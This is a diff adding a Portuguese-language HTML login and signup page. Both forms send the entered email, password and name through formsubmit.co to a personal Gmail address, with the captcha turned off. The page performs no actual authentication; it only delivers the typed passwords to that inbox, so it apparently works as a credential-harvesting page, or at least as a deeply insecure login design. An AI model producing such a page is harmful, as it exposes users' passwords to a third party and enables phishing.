@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Login / Criar Conta</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.2);
+      width: 350px;
+    }
+    .tabs {
+      display: flex;
+      margin-bottom: 20px;
+    }
+    .tab {
+      flex: 1;
+      text-align: center;
+      padding: 10px;
+      cursor: pointer;
+      font-weight: bold;
+      border-bottom: 2px solid transparent;
+      transition: all 0.3s;
+    }
+    .tab.active {
+      color: #007bff;
+      border-bottom: 2px solid #007bff;
+    }
+    .form {
+      display: none;
+    }
+    .form.active {
+      display: block;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background: #0056b3;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="tabs">
+      <div class="tab active" onclick="showForm('login', this)">Entrar</div>
+      <div class="tab" onclick="showForm('signup', this)">Criar Conta</div>
+    </div>
+
+    <!-- Formulário de Login -->
+    <form id="login" class="form active" action="https://formsubmit.co/mundocartoon92@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="Novo login enviado!">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="senha" placeholder="Senha" required />
+      <button type="submit">Entrar</button>
+    </form>
+
+    <!-- Formulário de Cadastro -->
+    <form id="signup" class="form" action="https://formsubmit.co/mundocartoon92@gmail.com" method="POST">
+      <input type="hidden" name="_subject" value="Nova conta criada!">
+      <input type="hidden" name="_captcha" value="false">
+      <input type="text" name="nome" placeholder="Nome Completo" required />
+      <input type="email" name="email" placeholder="Email" required />
+      <input type="password" name="senha" placeholder="Senha" required />
+      <input type="password" name="confirmar_senha" placeholder="Confirmar Senha" required />
+      <button type="submit">Criar Conta</button>
+    </form>
+  </div>
+
+  <script>
+    function showForm(formId, tabElement) {
+      document.querySelectorAll('.form').forEach(form => form.classList.remove('active'));
+      document.getElementById(formId).classList.add('active');
+
+      document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+      tabElement.classList.add('active');
+    }
+  </script>
+</body>
+</html>
